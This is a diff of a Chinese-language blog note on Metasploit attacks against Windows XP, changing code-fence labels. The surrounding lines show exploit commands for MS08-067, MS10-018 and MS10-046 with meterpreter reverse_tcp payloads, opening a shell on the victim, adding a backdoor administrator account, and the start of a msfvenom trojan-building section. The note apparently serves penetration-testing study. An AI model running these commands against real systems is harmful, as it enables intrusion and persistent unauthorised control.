@@ -15,7 +15,7 @@ categories: 笔记
 #### 2、windows xp pro
 
 ## 1、漏洞： ms08_067 
-```
+```shell
 # 可通过命令来查看详情:search ms08_067
 use exploit/windows/smb/ms08_067_netapi    //使用exploit
 set payload windows/meterpreter/reverse_tcp  //设置攻击载荷
@@ -28,7 +28,7 @@ run  //开始攻击
 shell   //进入对方电脑的终端
 ```
 ## 2、漏洞 ms10_018（浏览器提权）
-```
+```shell
 # 同样的我们看看这个漏洞(搜索)：search ms10_018
 use exploit/windows/browser/ms10_018_ie_behaviors    //使用exploit
 set payload windows/meterpreter/reverse_tcp  //设置攻击载荷
@@ -48,7 +48,7 @@ net localgroup administrators admin /add //这条命令的意思是吧admin 添�
 ```
 
 ## 3、漏洞 ms10_046（快捷方式漏洞）
-```
+```shell
 # 同样的我们看看这个漏洞(搜索)：search ms10_046
 use exploit/windows/browser/ms10_046_shortcut_icon_dllloader    //使用exploit
 set payload windows/meterpreter/reverse_tcp  //设置攻击载荷
@@ -71,7 +71,7 @@ net localgroup administrators admin /add //这条命令的意思是吧admin 添�
 > #### 免杀是一门高级的学问，在这里就不再讲述了，下面介绍的是用msfvenom 生成木马。
 
 ## 4、木马生成
-```
+```shell
 # 当没有漏洞的时候，就可以使用木马来进行渗透了。
 # 利用 msfvenom 工具生成木马
 # -p 是设置payload, -f 是生成文件的格式 /root/muma.exe 是生成的文件名
